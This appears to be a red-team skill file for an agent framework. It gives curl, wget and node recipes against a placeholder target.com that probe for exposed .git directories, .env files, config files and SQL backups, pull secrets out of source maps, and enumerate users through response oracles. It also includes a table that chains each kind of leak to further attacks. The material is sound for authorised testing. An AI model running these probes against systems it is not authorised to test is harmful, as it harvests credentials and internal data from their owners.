---
name: hunt-information-disclosure
description: Hunt error leakage, DVCS exposure, source maps, config files, and differential oracles.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, python3, httpx
metadata:
  tags: [redteam, information-disclosure, error-leakage, source-maps, config, enumeration]
  category: redteam
  related_skills:
    - source-leak-hunt
    - js-secrets-extraction
    - error-log-mining
    - web-enumeration
---

# Information Disclosure Hunting

Hunt for information exposure through stack traces, debug endpoints, versioned path discovery, source maps, and differential oracles. Each disclosure amplifies other vulnerabilities — a version number enables CVE targeting, a server path enables LFI, a schema leak enables auth bypass, and an error message reveals internal infrastructure.

## When to Use

- Applications return verbose error messages with stack traces, file paths, or SQL fragments.
- Source maps (.js.map) are deployed to production.
- Versioned static assets reveal framework/CMS versions.
- API responses differ by object existence (user enumeration by status/length/time).
- Debug endpoints, health checks, or status pages expose internal state.

## Quick Detection

```bash
# Trigger errors on common paths
for path in "/nonexistent" "/%00" "/.." "/error" "/debug"; do
  curl -sk "https://target.com$path" | grep -iE "stack|trace|exception|error|warning|debug|line [0-9]+" | head -5
done
```

## Procedure

### Phase 1 — Error & Exception Leakage

```bash
# Trigger errors with malformed input
curl -sk "https://target.com/api/users?id='"
curl -sk -X POST "https://target.com/api/login" -d '{"username":null}'
curl -sk "https://target.com/search?q=%00"

# Check response for sensitive data
# Stack traces → file paths, line numbers, framework version
# SQL errors → table names, column names, DB type
# Deserialization errors → class names, serialization format
# Template errors → template paths, engine type

# Fuzz for debug endpoints
for path in "/debug" "/__debug__" "/debugbar" "/_debug_toolbar" "/.well-known/debug" \
            "/actuator" "/actuator/info" "/actuator/env" "/actuator/health"; do
  curl -sk "https://target.com$path" -w "\n%{http_code} — $path\n" -o /dev/null
done
```

### Phase 2 — DVCS & Config File Discovery

```bash
# Git, SVN, Mercurial exposure
for path in "/.git/HEAD" "/.git/config" "/.svn/entries" "/.hg/store/"; do
  curl -sk "https://target.com$path" -w "%{http_code} — $path\n" -o /dev/null
done

# Config and env files
for pattern in ".env" ".env.local" ".env.production" ".env.staging" \
               "config.json" "config.yml" "settings.py" "settings.php" \
               "wp-config.php" "web.config" "app.config"; do
  curl -sk "https://target.com/$pattern" -w "%{http_code} — $pattern\n" -o /dev/null
done

# Backup files
for pattern in "backup.zip" "backup.sql" "dump.sql" "db.sql" \
               "database.sql" "export.sql" "site.tar.gz" "backup.tar.gz"; do
  curl -sk "https://target.com/$pattern" -w "%{http_code} — $pattern\n" -o /dev/null
done
```

### Phase 3 — Source Map Exploitation

```bash
# Find .js.map files
curl -sk "https://target.com" | grep -oP '[^"\s]+\.js\.map' | sort -u

# Download and extract
wget "https://target.com/static/app.js.map"
node -e "
const m=require('./app.js.map');
m.sources.forEach((s,i)=>require('fs').writeFileSync(s.split('/').pop(),m.sourcesContent[i]));
console.log('Extracted '+m.sources.length+' files');
"

# Look for NEXT_PUBLIC env vars in extracted source
grep -r "NEXT_PUBLIC_" extracted_files/ | cut -d= -f1 | sort -u
```

### Phase 4 — Differential Oracles

```bash
# User enumeration via status code
for id in {1..50}; do
  curl -sk "https://target.com/api/users/$id" -w "$id — %{http_code}\n" -o /dev/null
done

# Object existence via response size
for id in {1..100}; do
  size=$(curl -sk "https://target.com/api/orders/$id" -w "%{size_download}" -o /dev/null)
  echo "$id — $size bytes"
done | awk '$2 > 100 {print "EXISTS: "$0}'

# Timing oracle for blind enumeration
for id in {1..50}; do
  time curl -sk "https://target.com/api/users/$id" -o /dev/null -w "%{time_total}s $id\n"
done | sort -rn

# ETag/304 oracle
for id in {1..10}; do
  etag=$(curl -skI "https://target.com/api/users/$id" | grep -i etag)
  echo "$id: $etag"
done
```

### Phase 5 — Version & Technology Discovery

```bash
# Framework version from static assets
curl -sk "https://target.com/static/admin/css/base.css" | head -5
curl -sk "https://target.com" | grep -oP '(?:Django|Laravel|Rails|Express|Next\.js|Nuxt)[\s/]*v?[0-9.]+'

# Package manager lock files
curl -sk "https://target.com/composer.lock" | jq -r '.packages[] | select(.version) | "\(.name)@\(.version)"' 2>/dev/null
curl -sk "https://target.com/package-lock.json" | jq -r '.packages | to_entries[] | "\(.key)@\(.value.version)"' 2>/dev/null
curl -sk "https://target.com/yarn.lock" | head -30
```

### Phase 6 — Chaining Disclosures

Each disclosure type provides inputs for other attack vectors:

| Disclosure | Chains to |
|---|---|
| Framework version | CVE database lookup |
| Server path | LFI path traversal |
| Internal IP | SSRF target |
| API schema | Auth bypass via undocumented endpoint |
| Dependency version | Supply chain vulnerability |
| NEXT_PUBLIC variables | API key/Supabase/Firebase access |
| SQL error | SQL injection confirmation + DB type |

## Pitfalls

- **Not every error message is exploitable.** A generic "An error occurred" page with no details is not a finding.
- **Source maps may be empty or stripped.** Verify extracted content before reporting.
- **Differential oracles are statistical.** Confirm with at least 3 samples before reporting.
- **`.git` exposure must contain actual repo data, not just HTTP 200 on a path.** A catch-all SPA may return 200 for `/.git/HEAD` without serving git data.
- **Version disclosure alone is usually LOW severity.** Chain it — version → CVE → exploit.

## Verification

1. Error message contains actionable internal data (file path, SQL query, framework version).
2. Source map extraction produces real source files with identifiable code (not just webpack bootstrap).
3. Differential oracle consistently distinguishes between existing and non-existing resources.
4. Chain the disclosure to another vulnerability before reporting — standalone info disclosure is rarely critical.
5. For config files: the leaked data must contain credentials, API keys, or connection strings (not just generic config).

## Related Skills

- **`source-leak-hunt`** — Focused on `.env`, `.git`, and config file leakage.
- **`js-secrets-extraction`** — API keys and tokens in JavaScript bundles.
- **`error-log-mining`** — PHP error logs with credential and query leakage.
- **`web-enumeration`** — Path discovery that reveals sensitive endpoints.
